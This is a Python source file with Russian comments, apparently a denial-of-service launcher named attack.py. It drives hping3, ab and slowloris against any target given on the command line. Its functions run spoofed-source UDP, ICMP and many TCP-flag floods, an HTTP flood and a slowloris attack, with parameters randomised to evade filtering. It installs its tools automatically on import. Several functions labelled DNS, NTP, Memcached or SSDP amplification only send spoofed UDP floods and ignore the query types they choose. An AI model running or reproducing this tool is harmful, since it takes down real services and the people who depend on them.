import socket
import threading
import random
import sys
import time
import subprocess
import os
import signal
import struct
import argparse

# Принудительно отключаем буферизацию вывода
sys.stdout = open(sys.stdout.fileno(), mode=sys.stdout.mode, buffering=1)
sys.stderr = open(sys.stderr.fileno(), mode=sys.stderr.mode, buffering=1)

def check_and_install_tools():
    tools = {
        'hping3': 'hping3',
        'ab': 'apache2-utils',
        'slowloris': 'slowloris',
        'ping': 'iputils-ping'
    }
    
    for tool, package in tools.items():
        try:
            subprocess.run(['which', tool], check=True, capture_output=True)
        except subprocess.CalledProcessError:
            print(f"Установка {tool}...", flush=True)
            try:
                subprocess.run(['apt-get', 'update'], check=True)
                subprocess.run(['apt-get', 'install', '-y', package], check=True)
                print(f"{tool} успешно установлен", flush=True)
            except subprocess.CalledProcessError as e:
                print(f"Ошибка при установке {tool}: {str(e)}", file=sys.stderr, flush=True)
                sys.exit(1)

def signal_handler(signum, frame):
    print("\nПолучен сигнал завершения...", flush=True)
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

def udp_flood(target, port=80):
    try:
        # Запускаем hping3 для UDP флуда с улучшенными параметрами
        data_size = random.randint(100, 1490)  # Случайный размер данных
        interval = random.choice(['u1', 'u10', 'u100'])  # Случайный интервал
        flags = random.choice(['--frag', '--more-frag', '--dont-frag'])  # Случайные флаги фрагментации
        
        cmd = f"hping3 --udp -i {interval} -d {data_size} {flags} -p {port} --rand-source --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении UDP флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def tcp_syn_flood(target, port=80):
    try:
        # Запускаем hping3 для TCP SYN флуда с улучшенными параметрами
        window_size = random.randint(0, 65535)  # Случайный размер окна
        ttl = random.randint(1, 255)  # Случайный TTL
        tos = random.randint(0, 255)  # Случайный тип сервиса
        
        cmd = f"hping3 --syn -i u1 -p {port} --rand-source --win {window_size} --ttl {ttl} --tos {tos} --tcp-timestamp --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении TCP SYN флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def http_flood(target, port=80):
    try:
        # Запускаем ab для HTTP флуда с улучшенными параметрами
        methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "TRACE", "CONNECT"]
        paths = ["/", "/index.html", "/api", "/admin", "/login", "/wp-admin", "/phpmyadmin", "/.env", "/config.php"]
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Connection: keep-alive",
            "Upgrade-Insecure-Requests: 1"
        ]
        
        method = random.choice(methods)
        path = random.choice(paths)
        header = random.choice(headers)
        
        cmd = f"ab -n 1000000 -c 1000 -m {method} -H '{header}' -p /dev/null -T 'application/x-www-form-urlencoded' http://{target}:{port}{path}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении HTTP флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def icmp_flood(target):
    try:
        # Запускаем hping3 для ICMP флуда с улучшенными параметрами
        icmp_types = ["echo", "echo-reply", "dest-unreach", "source-quench", "redirect", "time-exceeded", "parameter-problem", "timestamp", "timestamp-reply", "info-request", "info-reply", "mask-request", "mask-reply"]
        icmp_type = random.choice(icmp_types)
        data_size = random.randint(100, 1490)  # Случайный размер данных
        interval = random.choice(['u1', 'u10', 'u100'])  # Случайный интервал
        
        cmd = f"hping3 --icmp -i {interval} --icmp-type {icmp_type} --rand-source -d {data_size} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении ICMP флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def slowloris(target, port=80):
    try:
        # Запускаем slowloris с улучшенными параметрами
        sockets = random.randint(500, 2000)  # Случайное количество сокетов
        timeout = random.randint(10, 30)  # Случайный таймаут
        interval = random.randint(1, 5)  # Случайный интервал
        
        cmd = f"slowloris -p {port} -s {sockets} -t {timeout} -i {interval} {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении Slowloris: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def dns_amplification(target, port=53):
    try:
        # Запускаем DNS amplification атаку с улучшенными параметрами
        query_types = ["ANY", "TXT", "SRV", "MX", "NS", "SOA"]
        query_type = random.choice(query_types)
        data_size = random.randint(100, 500)  # Случайный размер данных
        
        cmd = f"hping3 --udp -i u1 -p {port} --rand-source --data {data_size} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении DNS amplification: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def ntp_amplification(target, port=123):
    try:
        # Запускаем NTP amplification атаку с улучшенными параметрами
        query_types = ["monlist", "readvar", "version", "peers", "associations"]
        query_type = random.choice(query_types)
        data_size = random.randint(100, 500)  # Случайный размер данных
        
        cmd = f"hping3 --udp -i u1 -p {port} --rand-source --data {data_size} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении NTP amplification: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def memcached_amplification(target, port=11211):
    try:
        # Запускаем Memcached amplification атаку с улучшенными параметрами
        query_types = ["stats", "version", "slabs", "items", "settings"]
        query_type = random.choice(query_types)
        data_size = random.randint(100, 500)  # Случайный размер данных
        
        cmd = f"hping3 --udp -i u1 -p {port} --rand-source --data {data_size} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении Memcached amplification: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def ssdp_amplification(target, port=1900):
    try:
        # Запускаем SSDP amplification атаку с улучшенными параметрами
        query_types = ["M-SEARCH", "NOTIFY", "SUBSCRIBE", "UNSUBSCRIBE"]
        query_type = random.choice(query_types)
        data_size = random.randint(100, 500)  # Случайный размер данных
        
        cmd = f"hping3 --udp -i u1 -p {port} --rand-source --data {data_size} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении SSDP amplification: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def tcp_ack_flood(target, port=80):
    try:
        # Запускаем hping3 для TCP ACK флуда с улучшенными параметрами
        window_size = random.randint(0, 65535)  # Случайный размер окна
        ttl = random.randint(1, 255)  # Случайный TTL
        tos = random.randint(0, 255)  # Случайный тип сервиса
        interval = random.choice(['u1', 'u10', 'u100'])  # Случайный интервал
        
        cmd = f"hping3 --ack -i {interval} -p {port} --rand-source --win {window_size} --ttl {ttl} --tos {tos} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении TCP ACK флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def tcp_rst_flood(target, port=80):
    try:
        # Запускаем hping3 для TCP RST флуда с улучшенными параметрами
        window_size = random.randint(0, 65535)  # Случайный размер окна
        ttl = random.randint(1, 255)  # Случайный TTL
        tos = random.randint(0, 255)  # Случайный тип сервиса
        interval = random.choice(['u1', 'u10', 'u100'])  # Случайный интервал
        
        cmd = f"hping3 --rst -i {interval} -p {port} --rand-source --win {window_size} --ttl {ttl} --tos {tos} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении TCP RST флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def tcp_window_flood(target, port=80):
    try:
        # Запускаем hping3 для TCP Window флуда с улучшенными параметрами
        window_size = random.randint(0, 65535)  # Случайный размер окна
        ttl = random.randint(1, 255)  # Случайный TTL
        tos = random.randint(0, 255)  # Случайный тип сервиса
        interval = random.choice(['u1', 'u10', 'u100'])  # Случайный интервал
        
        cmd = f"hping3 --syn -i {interval} -p {port} --rand-source --win {window_size} --ttl {ttl} --tos {tos} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении TCP Window флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def tcp_fragment_flood(target, port=80):
    try:
        # Запускаем hping3 для TCP Fragment флуда с улучшенными параметрами
        fragment_size = random.randint(100, 1490)  # Случайный размер фрагмента
        ttl = random.randint(1, 255)  # Случайный TTL
        tos = random.randint(0, 255)  # Случайный тип сервиса
        interval = random.choice(['u1', 'u10', 'u100'])  # Случайный интервал
        flags = random.choice(['--frag', '--more-frag', '--dont-frag'])  # Случайные флаги фрагментации
        
        cmd = f"hping3 --syn -i {interval} -p {port} --rand-source -d {fragment_size} {flags} --ttl {ttl} --tos {tos} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении TCP Fragment флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def tcp_xmas_flood(target, port=80):
    try:
        # Запускаем hping3 для TCP XMAS флуда с улучшенными параметрами
        window_size = random.randint(0, 65535)  # Случайный размер окна
        ttl = random.randint(1, 255)  # Случайный TTL
        tos = random.randint(0, 255)  # Случайный тип сервиса
        interval = random.choice(['u1', 'u10', 'u100'])  # Случайный интервал
        
        cmd = f"hping3 --xmas -i {interval} -p {port} --rand-source --win {window_size} --ttl {ttl} --tos {tos} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении TCP XMAS флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def tcp_null_flood(target, port=80):
    try:
        # Запускаем hping3 для TCP NULL флуда с улучшенными параметрами
        window_size = random.randint(0, 65535)  # Случайный размер окна
        ttl = random.randint(1, 255)  # Случайный TTL
        tos = random.randint(0, 255)  # Случайный тип сервиса
        interval = random.choice(['u1', 'u10', 'u100'])  # Случайный интервал
        
        cmd = f"hping3 --null -i {interval} -p {port} --rand-source --win {window_size} --ttl {ttl} --tos {tos} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении TCP NULL флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def tcp_fin_flood(target, port=80):
    try:
        # Запускаем hping3 для TCP FIN флуда с улучшенными параметрами
        window_size = random.randint(0, 65535)  # Случайный размер окна
        ttl = random.randint(1, 255)  # Случайный TTL
        tos = random.randint(0, 255)  # Случайный тип сервиса
        interval = random.choice(['u1', 'u10', 'u100'])  # Случайный интервал
        
        cmd = f"hping3 --fin -i {interval} -p {port} --rand-source --win {window_size} --ttl {ttl} --tos {tos} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении TCP FIN флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def tcp_urg_flood(target, port=80):
    try:
        # Запускаем hping3 для TCP URG флуда с улучшенными параметрами
        window_size = random.randint(0, 65535)  # Случайный размер окна
        ttl = random.randint(1, 255)  # Случайный TTL
        tos = random.randint(0, 255)  # Случайный тип сервиса
        interval = random.choice(['u1', 'u10', 'u100'])  # Случайный интервал
        urg_pointer = random.randint(0, 65535)  # Случайный указатель URG
        
        cmd = f"hping3 --urg -i {interval} -p {port} --rand-source --win {window_size} --ttl {ttl} --tos {tos} --urg-pointer {urg_pointer} --flood {target}"
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip(), flush=True)
            error = process.stderr.readline()
            if error:
                print(error.strip(), file=sys.stderr, flush=True)
            
            if process.poll() is not None:
                break
                
    except Exception as e:
        print(f"Ошибка при выполнении TCP URG флуда: {str(e)}", file=sys.stderr, flush=True)
    finally:
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            process.kill()

def tcp_test(target, port=80, timeout=5):
    try:
        print(f"Тестирование TCP соединения с {target}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        sock.close()
        
        if result == 0:
            print(f"TCP порт {port} открыт")
            return True
        else:
            print(f"TCP порт {port} закрыт (код: {result})")
            return False
    except Exception as e:
        print(f"Ошибка при TCP тесте: {str(e)}")
        return False

def http_test(target, port=80, timeout=5):
    try:
        print(f"Тестирование HTTP соединения с {target}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))
        
        # Отправляем HTTP GET запрос
        request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
        sock.send(request.encode())
        
        # Получаем ответ
        response = sock.recv(1024).decode()
        sock.close()
        
        if "HTTP/" in response:
            print(f"HTTP сервер доступен: {response.split('\r\n')[0]}")
            return True
        else:
            print("Некорректный HTTP ответ")
            return False
    except Exception as e:
        print(f"Ошибка при HTTP тесте: {str(e)}")
        return False

def dns_test(target, port=53, timeout=5):
    try:
        print(f"Тестирование DNS сервера {target}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        
        # Формируем DNS запрос
        query = struct.pack("!HHHHHH", 0x1234, 0x0100, 0x0001, 0, 0, 0)
        query += b"\x03www\x06google\x03com\x00"  # www.google.com
        query += struct.pack("!HH", 0x0001, 0x0001)
        
        sock.sendto(query, (target, port))
        response, _ = sock.recvfrom(1024)
        sock.close()
        
        if len(response) > 0:
            print("DNS сервер отвечает")
            return True
        else:
            print("DNS сервер не ответил")
            return False
    except Exception as e:
        print(f"Ошибка при DNS тесте: {str(e)}")
        return False

def main():
    if len(sys.argv) < 3:
        print("Использование: python3 attack.py <тип_атаки> <цель> [--параметр1 значение1] [--параметр2 значение2] ...")
        sys.exit(1)

    attack_type = sys.argv[1]
    target = sys.argv[2]
    
    # Получаем дополнительные параметры из аргументов командной строки
    params = {}
    for i in range(3, len(sys.argv), 2):
        if i + 1 < len(sys.argv):
            param = sys.argv[i].lstrip('--')
            value = sys.argv[i + 1]
            params[param] = value

    # Запускаем тестовые атаки
    if attack_type == "5_3":  # TCP Test
        try:
            port = int(params.get('port', 80))
            timeout = int(params.get('timeout', 5))
            threads_count = int(params.get('threads', 1))
            test_duration = int(params.get('test_duration', 10))

            print(f"Запуск TCP теста с параметрами:")
            print(f"Цель: {target}")
            print(f"Порт: {port}")
            print(f"Таймаут: {timeout} сек")
            print(f"Количество потоков: {threads_count}")
            print(f"Длительность теста: {test_duration} сек")

            threads = []
            for _ in range(threads_count):
                thread = threading.Thread(target=tcp_test, args=(target, port, timeout))
                thread.daemon = True
                thread.start()
                threads.append(thread)

            time.sleep(test_duration)
            for thread in threads:
                if thread.is_alive():
                    thread.join(timeout=timeout)

            print("TCP тест завершен")
            return

        except Exception as e:
            print(f"Ошибка при выполнении TCP теста: {str(e)}", file=sys.stderr, flush=True)
            return

    elif attack_type == "5_4":  # HTTP Test
        try:
            port = int(params.get('port', 80))
            timeout = int(params.get('timeout', 5))
            threads_count = int(params.get('threads', 1))
            test_duration = int(params.get('test_duration', 10))

            print(f"Запуск HTTP теста с параметрами:")
            print(f"Цель: {target}")
            print(f"Порт: {port}")
            print(f"Таймаут: {timeout} сек")
            print(f"Количество потоков: {threads_count}")
            print(f"Длительность теста: {test_duration} сек")

            threads = []
            for _ in range(threads_count):
                thread = threading.Thread(target=http_test, args=(target, port, timeout))
                thread.daemon = True
                thread.start()
                threads.append(thread)

            time.sleep(test_duration)
            for thread in threads:
                if thread.is_alive():
                    thread.join(timeout=timeout)

            print("HTTP тест завершен")
            return

        except Exception as e:
            print(f"Ошибка при выполнении HTTP теста: {str(e)}", file=sys.stderr, flush=True)
            return

    elif attack_type == "5_5":  # DNS Test
        try:
            port = int(params.get('port', 53))
            timeout = int(params.get('timeout', 5))
            threads_count = int(params.get('threads', 1))
            test_duration = int(params.get('test_duration', 10))

            print(f"Запуск DNS теста с параметрами:")
            print(f"Цель: {target}")
            print(f"Порт: {port}")
            print(f"Таймаут: {timeout} сек")
            print(f"Количество потоков: {threads_count}")
            print(f"Длительность теста: {test_duration} сек")

            threads = []
            for _ in range(threads_count):
                thread = threading.Thread(target=dns_test, args=(target, port, timeout))
                thread.daemon = True
                thread.start()
                threads.append(thread)

            time.sleep(test_duration)
            for thread in threads:
                if thread.is_alive():
                    thread.join(timeout=timeout)

            print("DNS тест завершен")
            return

        except Exception as e:
            print(f"Ошибка при выполнении DNS теста: {str(e)}", file=sys.stderr, flush=True)
            return

    # Запускаем остальные атаки в отдельных потоках
    threads_count = int(params.get('threads', 1))
    for _ in range(threads_count):
        if attack_type == "1_1":
            thread = threading.Thread(target=udp_flood, args=(target,))
        elif attack_type == "1_2":
            thread = threading.Thread(target=tcp_syn_flood, args=(target,))
        elif attack_type == "1_3":
            thread = threading.Thread(target=http_flood, args=(target,))
        elif attack_type == "1_4":
            thread = threading.Thread(target=icmp_flood, args=(target,))
        elif attack_type == "3_1":
            thread = threading.Thread(target=slowloris, args=(target,))
        elif attack_type == "2_1":
            thread = threading.Thread(target=dns_amplification, args=(target,))
        elif attack_type == "2_2":
            thread = threading.Thread(target=ntp_amplification, args=(target,))
        elif attack_type == "2_3":
            thread = threading.Thread(target=memcached_amplification, args=(target,))
        elif attack_type == "2_4":
            thread = threading.Thread(target=ssdp_amplification, args=(target,))
        elif attack_type == "1_10":
            thread = threading.Thread(target=tcp_ack_flood, args=(target,))
        elif attack_type == "1_11":
            thread = threading.Thread(target=tcp_rst_flood, args=(target,))
        elif attack_type == "1_12":
            thread = threading.Thread(target=tcp_window_flood, args=(target,))
        elif attack_type == "1_13":
            thread = threading.Thread(target=tcp_fragment_flood, args=(target,))
        elif attack_type == "1_14":
            thread = threading.Thread(target=tcp_xmas_flood, args=(target,))
        elif attack_type == "1_15":
            thread = threading.Thread(target=tcp_null_flood, args=(target,))
        elif attack_type == "1_16":
            thread = threading.Thread(target=tcp_fin_flood, args=(target,))
        else:
            print(f"Неизвестный тип атаки: {attack_type}")
            return

        thread.daemon = True
        thread.start()
        thread.join()  # Ждем завершения потока

# Проверяем наличие необходимых инструментов при запуске
check_and_install_tools()

if __name__ == "__main__":
    main() 